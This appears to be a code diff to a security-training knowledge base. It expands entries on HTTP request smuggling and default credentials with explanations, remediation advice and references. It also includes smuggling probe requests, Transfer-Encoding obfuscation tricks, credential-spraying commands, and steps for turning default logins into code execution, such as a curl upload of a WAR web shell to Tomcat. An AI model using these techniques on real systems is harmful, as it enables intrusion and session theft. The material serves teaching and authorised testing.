-        "brief": "When traffic passes through a chain of servers (CDN/proxy in front of an application server), both must agree on each request's boundary. If one uses the Content-Length header and the other uses Transfer-Encoding: chunked - and they can be made to disagree - an attacker can append a partial 'smuggled' request that the back-end treats as the start of the next user's request.\n\nImpact: capturing other users' requests (including their cookies/credentials), poisoning responses served to them, bypassing front-end security controls, and turning a reflected issue into a widespread one. The main variants are CL.TE, TE.CL, and TE.TE.",
+        "brief": "HTTP Request Smuggling (also called desync) exploits a disagreement between two servers in a chain — typically a front-end (CDN, reverse proxy, load balancer) and a back-end application server that share a keep-alive connection — about where one HTTP request ends and the next begins. HTTP offers two ways to declare a body's length: the Content-Length (CL) header, and Transfer-Encoding: chunked (TE). If the front-end uses one to delimit the request and the back-end uses the other, an attacker can craft a message that the front-end sees as a single request but the back-end splits into two — the second, 'smuggled' request being prepended to whatever the NEXT client sends on that shared connection.\n\nThe classic variants are named by which server trusts which header: CL.TE (front-end honours Content-Length, back-end honours Transfer-Encoding), TE.CL (the reverse), and TE.TE (both understand TE, but one is tricked into ignoring an obfuscated Transfer-Encoding header). Modern HTTP/2 downgrading introduces further variants (H2.CL, H2.TE) where an HTTP/2 front-end rewrites to HTTP/1.1 for the back-end and reintroduces the ambiguity.\n\nThe impact is unusually broad and affects OTHER users: capturing victims' requests (and their session cookies/credentials), poisoning the response queue so victims receive attacker-influenced responses, bypassing front-end security controls (WAF, auth) by hiding the real request from them, turning an on-site redirect into an open redirect or cache poisoning, and mass-exploiting what would otherwise be a self-only issue.",
         "quickReference": [
-          { "label": "CL.TE - front-end uses Content-Length", "cmd": "Content-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG   (the 'G' is prepended to the next request)" },
-          { "label": "TE.CL - front-end uses Transfer-Encoding", "cmd": "Content-Length: 3\nTransfer-Encoding: chunked\n\n<chunk sizes crafted so the back-end stops early>" },
-          { "label": "TE.TE - obfuscate the header", "cmd": "Transfer-Encoding: xchunked  /  Transfer-Encoding:[tab]chunked  (one server ignores it)" },
-          { "label": "Detect safely", "cmd": "use Burp Suite + the HTTP Request Smuggler extension (timing-based probes)" }
+          { "label": "CL.TE — front-end uses CL", "cmd": "Content-Length: 6 + TE: chunked, body: 0\\r\\n\\r\\nG  (G prefixes the next request)" },
+          { "label": "TE.CL — front-end uses TE", "cmd": "CL: 3 + TE: chunked, with chunk sizes crafted so the back-end stops early" },
+          { "label": "TE.TE — obfuscate TE", "cmd": "Transfer-Encoding: xchunked / TE:[tab]chunked / duplicate TE (one server ignores it)" },
+          { "label": "Detect safely", "cmd": "Burp + HTTP Request Smuggler (timing-based, avoids poisoning real users)" }
         ],
         "sections": [
-          { "title": "How It's Exploited", "type": "commands", "commands": [
-            { "label": "1. Detect with a timing probe", "cmd": "# send a request that, if smuggling works, makes the back-end wait for more data\n# a delayed response indicates a desync. Burp 'HTTP Request Smuggler' automates this\n# CL.TE detection body:\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nA\nX" },
-            { "label": "2. Confirm with a smuggled prefix", "cmd": "# smuggle the start of a request so the NEXT visitor's request is appended to it\n# e.g. force their request onto an endpoint you control and observe the effect" },
-            { "label": "3. Weaponise", "cmd": "# capture another user's request (steal cookies), or\n# poison the response queue so victims receive your response, or\n# bypass a front-end WAF/auth check by hiding the real request from it" }
+          { "title": "Root Cause & Mechanism", "type": "notes", "items": [
+            "Two length signals exist in HTTP/1.1: Content-Length and Transfer-Encoding: chunked. The RFC says TE wins if both are present, but not every server obeys — the disagreement is the whole bug.",
+            "Front-end and back-end share a persistent (keep-alive) connection, so bytes the back-end considers 'left over' from your request are treated as the start of the next request on that connection — usually another user's.",
+            "CL.TE: the front-end reads Content-Length bytes and forwards everything; the back-end processes chunked and stops at the 0-chunk, leaving your trailing bytes as a smuggled request prefix.",
+            "TE.CL: the front-end processes chunked; the back-end reads only Content-Length bytes, leaving the rest to smuggle.",
+            "HTTP/2 downgrade (H2.CL/H2.TE): an HTTP/2 front-end that rewrites to HTTP/1.1 can carry an attacker-set length/TE into the back-end, or fail to sanitise, re-creating the desync."
           ]},
-          { "title": "Variants & Impact", "type": "table", "columns": ["Variant", "Cause / Impact"], "rows": [
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Any site fronted by a CDN/reverse proxy/load balancer (most non-trivial deployments) where a different server handles the application.",
+            "Endpoints that reflect part of the request or that other users hit frequently (needed to observe capture/poisoning).",
+            "HTTP/2 front-ends that downgrade to HTTP/1.1 for the origin — a rich modern source of desync.",
+            "Places where a smuggled request could reach an internal-only or privileged endpoint the front-end would otherwise block.",
+            "Because live exploitation affects real users, prefer timing-based detection and test with authorisation."
+          ]},
+          { "title": "Step 1 — Detect the Desync (Timing)", "type": "commands", "commands": [
+            { "label": "CL.TE timing probe", "cmd": "# if vulnerable, the back-end waits for a chunk that never comes -> delayed response\nPOST / HTTP/1.1\nHost: target\nTransfer-Encoding: chunked\nContent-Length: 4\n\n1\nA\nX\n# a hang/delay indicates the back-end is using TE (front-end used CL)" },
+            { "label": "TE.CL timing probe", "cmd": "POST / HTTP/1.1\nHost: target\nTransfer-Encoding: chunked\nContent-Length: 6\n\n0\n\nX\n# reversed behaviour indicates TE.CL" },
+            { "label": "Automate (safest)", "cmd": "# Burp 'HTTP Request Smuggler' -> Smuggle probe / HTTP Request Smuggler\n# it uses timing so it does not poison other users during detection\n# also test HTTP/2 downgrade with the extension's H2 options" },
+            { "label": "Send raw bytes", "cmd": "# disable automatic CL/header fixups (Burp Repeater: uncheck 'Update Content-Length',\n# use \\r\\n line endings) so the exact bytes reach the server unmodified" }
+          ]},
+          { "title": "Step 2 — Confirm & Weaponise", "type": "commands", "commands": [
+            { "label": "Confirm with a smuggled prefix (self-test)", "cmd": "# smuggle a request prefix, then send a normal follow-up request on the same connection\n# and observe it being appended to your prefix (e.g. it lands on a different path,\n# or returns a 404/405 proving your bytes were prepended)" },
+            { "label": "Capture another user's request", "cmd": "# smuggle a request whose body is a form/param that stores and reflects data;\n# the next victim's full request (headers, cookies) gets appended into that param\n# -> retrieve it from where the app stores/reflects it = their session cookie" },
+            { "label": "Bypass front-end controls", "cmd": "# the front-end enforces auth/WAF on the URL it SEES; smuggle a request to a blocked\n# path (e.g. /admin) inside a body the front-end treats as data:\n# the back-end processes the hidden request without the front-end's checks" },
+            { "label": "Response queue poisoning / cache poisoning", "cmd": "# desync so responses shift by one on the connection -> a victim receives YOUR\n# response (or a cached poisoned one). Combine with an on-site redirect to make it open." }
+          ]},
+          { "title": "Variants & Impact", "type": "table", "columns": ["Variant / Impact", "Detail"], "rows": [
             ["CL.TE", "Front-end uses Content-Length, back-end uses Transfer-Encoding"],
             ["TE.CL", "Front-end uses Transfer-Encoding, back-end uses Content-Length"],
-            ["TE.TE", "Both support TE but one is tricked into ignoring an obfuscated header"],
-            ["Impact - request capture", "Steal victims' cookies/credentials from their requests"],
-            ["Impact - response poisoning", "Serve attacker content to other users"],
-            ["Impact - control bypass", "Hide a request from the front-end WAF/auth layer"]
+            ["TE.TE", "Both support TE; one is tricked into ignoring an obfuscated TE header"],
+            ["H2.CL / H2.TE", "HTTP/2 front-end downgrades to HTTP/1.1 and reintroduces the ambiguity"],
+            ["Request capture", "Steal victims' cookies/credentials from their smuggled-in requests"],
+            ["Response poisoning", "Serve attacker-influenced/cached responses to other users"],
+            ["Control bypass", "Reach endpoints the front-end WAF/auth would block"]
+          ]},
+          { "title": "TE Obfuscation (TE.TE)", "type": "commands", "commands": [
+            { "label": "Header-parsing quirks", "cmd": "Transfer-Encoding: xchunked\nTransfer-Encoding : chunked        # space before colon\nTransfer-Encoding:[tab]chunked\n Transfer-Encoding: chunked        # leading space (folded)\nX: X[\\n]Transfer-Encoding: chunked\nTransfer-Encoding\n: chunked" },
+            { "label": "Duplicate headers", "cmd": "Transfer-Encoding: chunked\nTransfer-Encoding: identity\n# one server honours the first, the other the second -> desync" }
+          ]},
+          { "title": "Impact & Attack Chain", "type": "table", "columns": ["Step", "Action", "Result"], "rows": [
+            ["1", "Timing-probe for a CL/TE disagreement", "A desync is present"],
+            ["2", "Confirm with a smuggled prefix", "Control over the next request on the connection"],
+            ["3", "Capture requests / bypass controls / poison responses", "Cookies stolen, WAF bypass, or victims served attacker content"],
+            ["4", "Chain (e.g. steal session -> takeover)", "Widespread, cross-user compromise"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite (Repeater, raw mode)", "Send exact bytes without header fixups; manual desync crafting"],
+            ["HTTP Request Smuggler (Burp ext)", "Automated timing detection, HTTP/2 desync, and exploitation helpers"],
+            ["Turbo Intruder", "High-rate follow-up requests to win the desync/capture window"],
+            ["smuggler.py", "Standalone CL/TE desync scanner"]
           ]},
           { "title": "References", "type": "references", "items": [
-            { "label": "PortSwigger - HTTP request smuggling", "url": "https://portswigger.net/web-security/request-smuggling" },
+            { "label": "PortSwigger — HTTP request smuggling (with labs)", "url": "https://portswigger.net/web-security/request-smuggling" },
+            { "label": "PortSwigger research — HTTP/2 desync & Browser-Powered attacks", "url": "https://portswigger.net/research/http2" },
             { "label": "HTTP Request Smuggler (Burp extension)", "url": "https://github.com/PortSwigger/http-request-smuggler" }
           ]},
           { "title": "Remediation", "type": "notes", "items": [
-            "Make the whole chain handle request boundaries identically - ideally use HTTP/2 end to end and downgrade carefully.",
-            "Configure the front-end to normalise ambiguous requests and reject any with both Content-Length and Transfer-Encoding.",
-            "Reject malformed or obfuscated Transfer-Encoding headers rather than trying to interpret them.",
-            "Disable connection reuse to the back-end where feasible, so a smuggled prefix cannot bleed into another user's request.",
-            "Keep proxies, load balancers, and application servers patched - many desync bugs are fixed at that layer."
+            "Make the entire chain parse request boundaries identically — prefer HTTP/2 end-to-end, and if you must downgrade to HTTP/1.1 for the back-end, do it strictly and re-validate lengths.",
+            "Configure the front-end to normalise ambiguous requests and reject any request that contains BOTH Content-Length and Transfer-Encoding (or that has a malformed/obfuscated TE header).",
+            "Reject, rather than 'best-effort interpret', non-standard Transfer-Encoding values and duplicated length headers.",
+            "Disable back-end connection reuse (or use one connection per client) where feasible so a smuggled prefix cannot bleed into another user's request.",
+            "Keep CDNs, proxies, load balancers, and application servers patched — many desync classes are fixed at that layer.",
+            "Use a WAF/front-end that specifically detects smuggling patterns as defence-in-depth, not as the primary fix."
           ]}
         ]
       },
@@ -5957,23 +6100,23 @@ var VULNS = [
         severity: "High",
         ref: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
         description: "Devices, panels, and services left on vendor-default or well-known credentials grant instant access.",
-        brief: "Default credentials are the factory or documented username/password pairs shipped with software, appliances, and services. When they are never changed, anyone who knows the vendor default — and they are all published — logs straight in.\n\nImpact: instant, often highest-privilege access to admin panels, routers, printers, databases, and management interfaces. It is unglamorous and extremely common, frequently providing the best foothold on a network for zero effort.",
+        brief: "Default credentials are the factory-set or documented username/password pairs that software, appliances, and services ship with — admin/admin, root/root, sa with a blank password, tomcat/tomcat, guest/guest, and thousands of product-specific pairs. They exist so a product works out of the box, and every one of them is published in vendor manuals and public databases. When an operator deploys the system and never changes them, anyone who knows the default (i.e. anyone) authenticates instantly.\n\nThis is a configuration failure rather than a code flaw, which is exactly why it is so common: it slips past developers (it is an ops task) and past ops (it is 'just the default'). It shows up on internet-facing admin panels, home and enterprise routers, printers and IP cameras, databases, application-server consoles, and out-of-band management (iDRAC/iLO/IPMI). Related weak states include blank/absent passwords and undocumented but well-known 'support' or 'debug' accounts.\n\nImpact is disproportionate to the effort: because these credentials usually belong to administrative or management interfaces, a single hit often yields the highest privilege on a device or the ability to run code (deploy a WAR on Tomcat, run a Jenkins script-console job, mount virtual media on iLO). On an internal engagement, default credentials are frequently the fastest and quietest route to a foothold and lateral movement.",
         quickReference: [
-          { label: "Classic pairs", cmd: "admin/admin  admin/password  root/root  sa/(blank)  tomcat/tomcat" },
-          { label: "Product examples", cmd: "Jenkins, Grafana admin/admin; Tomcat manager; iDRAC/iLO; DB defaults" },
+          { label: "Classic pairs", cmd: "admin/admin  admin/password  root/root  sa/(blank)  tomcat/tomcat  guest/guest" },
+          { label: "Product examples", cmd: "Jenkins & Grafana admin/admin; Tomcat manager; iDRAC/iLO; RabbitMQ guest/guest" },
           { label: "Spray defaults across a service", cmd: "netexec <proto> <targets> -u users.txt -p defaults.txt --no-bruteforce" },
-          { label: "References", cmd: "Vendor manuals, SecLists Default-Credentials, DefaultCreds-cheat-sheet" }
+          { label: "Lists", cmd: "vendor manuals, SecLists Default-Credentials, DefaultCreds-cheat-sheet" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Fingerprint the product", cmd: "whatweb https://target        # identify the software + version\nnuclei -u https://target -tags tech    # tech detection\n# knowing the product tells you which default to try" },
-              { label: "2. Look up the documented default", cmd: "# consult vendor docs / default-credential databases:\n#   SecLists/Passwords/Default-Credentials, DefaultCreds-cheat-sheet\n# e.g. Grafana admin/admin, Tomcat tomcat/tomcat, RabbitMQ guest/guest" },
-              { label: "3. Test the top pairs (mind lockouts)", cmd: "# web panel: try the documented pair in the login form\n# services, non-destructively:\nnetexec ssh 10.0.0.0/24 -u root -p 'toor' --no-bruteforce\nnetexec mssql <host> -u sa -p '' \n# --no-bruteforce pairs the i-th user with the i-th password only" },
-              { label: "4. Automate across many products", cmd: "nuclei -u https://target -tags default-login\n# default-logins/ templates try known product defaults automatically" },
-              { label: "5. Confirm and use the access", cmd: "# log in; e.g. Tomcat manager -> deploy a WAR web shell,\n# Jenkins -> script console RCE, iDRAC/iLO -> virtual media / console" }
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "Products ship usable out of the box with a known credential; security depends on the operator changing it, and there is often no forced first-login rotation to make them.",
+              "It is an ownership gap: developers consider it deployment, operators consider it the default — so it is nobody's explicit task and persists.",
+              "The credentials are not secret: they are in manuals, quick-start guides, and curated databases, so 'nobody knows it' is never true.",
+              "Adjacent states to test: blank/empty passwords, username == password, and undocumented support/maintenance/debug accounts.",
+              "Because the accounts are usually administrative, the value of a hit is high — frequently direct code execution or full device control."
             ]
           },
           {
@@ -5982,21 +6125,52 @@ var VULNS = [
             columns: ["Target", "Common defaults"],
             rows: [
               ["Web admin panels", "admin/admin, admin/password, product-specific pairs"],
-              ["App servers", "Tomcat manager (tomcat/tomcat), JBoss, WebLogic consoles"],
-              ["Databases", "sa with blank password (MSSQL), root with no password (MySQL/Mongo)"],
-              ["Management interfaces", "iDRAC/iLO/IPMI, switches, routers, printers, cameras"],
-              ["Dev/monitoring tools", "Jenkins, Grafana, Kibana, RabbitMQ (guest/guest)"]
+              ["App-server consoles", "Tomcat manager (tomcat/tomcat), JBoss, WebLogic, WebSphere"],
+              ["Databases", "MSSQL sa/(blank), MySQL root/(blank), Mongo/Redis unauthenticated, Postgres postgres/postgres"],
+              ["Management interfaces", "iDRAC (root/calvin), iLO, IPMI, switches, routers, printers, IP cameras"],
+              ["Dev / monitoring tools", "Jenkins, Grafana (admin/admin), Kibana, RabbitMQ (guest/guest), Airflow"],
+              ["Message/queue & cache", "RabbitMQ guest/guest, Redis (no auth), Elasticsearch (open)"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Step 1 — Identify the Product",
+            type: "commands",
+            commands: [
+              { label: "Fingerprint the software + version", cmd: "whatweb https://target\nnuclei -u https://target -tags tech\n# a login page's title/favicon/headers usually name the product exactly" },
+              { label: "Find admin/login endpoints", cmd: "ffuf -w SecLists/Discovery/Web-Content/common.txt -u https://target/FUZZ\n# look for /admin, /manager, /login, /console, product-specific paths" },
+              { label: "Discover management services (internal)", cmd: "nmap -sV --top-ports 1000 <targets>\n# flag SSH, RDP, SMB, MSSQL, MySQL, Redis, iDRAC/iLO, printers, cameras" }
+            ]
+          },
+          {
+            title: "Step 2 — Test Defaults (Carefully)",
+            type: "commands",
+            commands: [
+              { label: "Look up the documented default", cmd: "# consult vendor docs and default-credential databases before spraying:\n#   SecLists/Passwords/Default-Credentials/, ihebski/DefaultCreds-cheat-sheet\ncreds search grafana        # DefaultCreds-cheat-sheet CLI\n# e.g. Grafana admin/admin, iDRAC root/calvin, RabbitMQ guest/guest" },
+              { label: "Try the top pairs in a web panel", cmd: "# mind account lockout — try the 1-3 documented pairs first, not a full brute\nadmin:admin   admin:password   <product-default>" },
+              { label: "Spray a network service (non-destructive)", cmd: "# --no-bruteforce pairs the i-th user with the i-th password only (no full matrix)\nnetexec ssh 10.0.0.0/24 -u users.txt -p passes.txt --no-bruteforce\nnetexec mssql <host> -u sa -p ''\nnetexec smb <host> -u admin -p admin" },
+              { label: "Automate known product defaults", cmd: "nuclei -u https://target -tags default-login\n# the default-logins/ templates try each product's known pair automatically" }
+            ]
+          },
+          {
+            title: "Step 3 — Turn Access Into Impact",
+            type: "commands",
+            commands: [
+              { label: "Tomcat manager -> RCE", cmd: "# deploy a WAR web shell via the manager app you just logged into:\ncurl -u tomcat:tomcat -T shell.war 'http://target:8080/manager/text/deploy?path=/x'\ncurl http://target:8080/x/   # web shell" },
+              { label: "Jenkins -> RCE", cmd: "# Manage Jenkins -> Script Console (Groovy):\n'id'.execute().text" },
+              { label: "iDRAC/iLO -> host control", cmd: "# root:calvin (Dell iDRAC) / Administrator (iLO) -> virtual media, remote console,\n# mount an ISO and boot -> full server takeover" },
+              { label: "DB defaults -> data / RCE", cmd: "# MSSQL sa/(blank) -> xp_cmdshell; MySQL root -> read/write files;\n# Redis (no auth) -> write a cron/webshell/SSH key" }
+            ]
+          },
+          {
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
-              ["1", "Fingerprint the product", "Known default to try"],
+              ["1", "Fingerprint the product/service", "Known default to try"],
               ["2", "Look up the vendor default", "Candidate credential pair"],
-              ["3", "Log in with the default", "Authenticated access"],
-              ["4", "Abuse the panel's features", "RCE / data / pivot"]
+              ["3", "Log in with the default (mind lockout)", "Authenticated, often admin, access"],
+              ["4", "Abuse the interface's features", "RCE / data theft / device takeover"],
+              ["5", "Pivot with harvested creds", "Lateral movement across the network"]
             ]
           },
           {
@@ -6005,8 +6179,9 @@ var VULNS = [
             columns: ["Tool", "Purpose"],
             rows: [
               ["WhatWeb / Nuclei", "Fingerprint products and run default-login templates"],
-              ["NetExec", "Test default pairs across SMB/SSH/MSSQL/WinRM/etc."],
-              ["SecLists / DefaultCreds-cheat-sheet", "Authoritative default-credential lists"]
+              ["NetExec (CrackMapExec)", "Test default pairs across SMB/SSH/MSSQL/WinRM/RDP/etc."],
+              ["Hydra / Medusa", "Targeted credential testing against a login/service"],
+              ["SecLists / DefaultCreds-cheat-sheet", "Authoritative default-credential lists (and the creds CLI)"]
             ]
           },
           {
@@ -6014,6 +6189,7 @@ var VULNS = [
             type: "references",
             items: [
               { label: "OWASP — Security Misconfiguration (A05:2021)", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
+              { label: "OWASP WSTG — Testing for Default Credentials", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials" },
               { label: "DefaultCreds-cheat-sheet", url: "https://github.com/ihebski/DefaultCreds-cheat-sheet" }
             ]
           },
@@ -6021,11 +6197,12 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Change every default credential before a system goes into service; make it a deployment checklist item.",
-              "Enforce a strong-password policy and MFA on management and admin interfaces.",
-              "Do not expose management interfaces to untrusted networks; segment and firewall them.",
-              "Inventory devices and scan periodically with default-credential checks (Nuclei default-logins).",
-              "Disable or remove unused default/sample accounts entirely."
+              "Change every default credential before a system goes into service, and force a credential change on first login where the product supports it; make it a mandatory deployment-checklist item.",
+              "Enforce a strong-password policy and MFA on all management and admin interfaces, and reject username==password and blank passwords.",
+              "Do not expose management interfaces (databases, iDRAC/iLO/IPMI, consoles) to the internet or untrusted networks — segment and firewall them.",
+              "Maintain an asset inventory and scan periodically with default-credential checks (Nuclei default-logins, NetExec) to catch regressions and new devices.",
+              "Disable or remove unused default, sample, and support accounts entirely rather than merely renaming them.",
+              "Bake secure-by-default configuration into deployment automation (IaC) so no environment is stood up with factory credentials."
             ]
           }
         ]
